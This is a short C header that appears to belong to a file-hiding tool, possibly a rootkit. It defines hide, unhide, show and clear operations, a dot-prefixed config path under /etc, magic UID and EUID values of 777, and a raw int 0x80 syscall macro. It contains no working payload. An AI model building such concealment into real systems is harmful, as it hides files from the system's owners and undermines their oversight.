#ifndef _DEF_H_
#define _DEF_H_

/* Error no */
#define NOERR		0
#define NOMEM		1
#define ACCERR		2
#define NOENT		3
#define LENOVER		4
#define SLOTFULL	5	
#define NOFILE		6
#define UNKNOWN		7

#define HIDE_NUM	4
#define PARAM_FILE	"/etc/.h-tool/.h_filter"

/* function no */
#define HIDE_FILE	1
#define UNHIDE_FIFE 2
#define SHOW_HIDE	3
#define CLEAR_HIDE	4

#define UID	 777
#define EUID 777
#define MAX_LEN	16	//I know the len of filename in kernel longer than it but...
#define BUF_SIZE 64


#define syscall_return(type, res)	\
	do{	\
		if ((unsigned long)(res) >= (unsigned long)(-(128+1))) {	\
				errno  = -(res);	\
		}	\
		return (type)(res);			\
	}while(0)

#define syscall2(type, name, type1, arg1, type2, arg2)		\
	type name (type1 arg1, type2 arg2)		\
	{		\
		long res;		\
		asm volatile("int $0x80"	\
					:"=a"(res)	\
					:"0"(__NR_##name), "b"((long)(arg1)), "c"((long)(arg2))	\
					);		\
		syscall_return(type, res);	\
	}


#endif
